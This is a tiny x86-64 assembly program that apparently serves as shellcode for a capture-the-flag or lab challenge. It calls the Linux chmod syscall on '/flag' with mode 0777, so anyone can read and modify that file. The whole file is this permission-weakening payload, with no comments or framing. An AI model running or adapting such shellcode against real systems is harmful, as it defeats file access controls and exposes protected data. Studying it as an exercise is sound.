.global _start
_start:
.intel_syntax noprefix
        mov rax, 90
        lea rdi, [rip+flag]
        mov rsi, 0777
        syscall


flag:
        .ascii "/flag"
